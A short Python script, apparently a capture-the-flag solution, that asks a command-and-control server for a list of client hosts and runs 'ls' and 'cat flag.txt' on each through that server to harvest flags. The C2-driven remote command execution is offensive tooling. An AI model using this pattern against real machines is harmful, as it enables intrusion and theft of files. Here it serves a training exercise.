import requests
import threading

serverCommandURL = "https://cc.attacking.systems/?command="

def sendCommand(command):
    return requests.get(serverCommandURL+command).text

def checkForFlag(clientIP):
    # List files on client and check if a file called flag is found
    if sendCommand("run " + clientIP + " ls").__contains__("flag"):
        # If flag is found, print the flag by reading the file content with cat
        print("Found flag on host " + clientIP + ".\nflag: " + sendCommand("run " + clientIP + " cat flag.txt"))

def main():
    clientIPs = sendCommand("list").split("\n")

    # Start unique thread for each client in clientIPs for faster execution
    threads = []
    for clientIP in clientIPs:
        thread = threading.Thread(target=checkForFlag, args=(clientIP,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
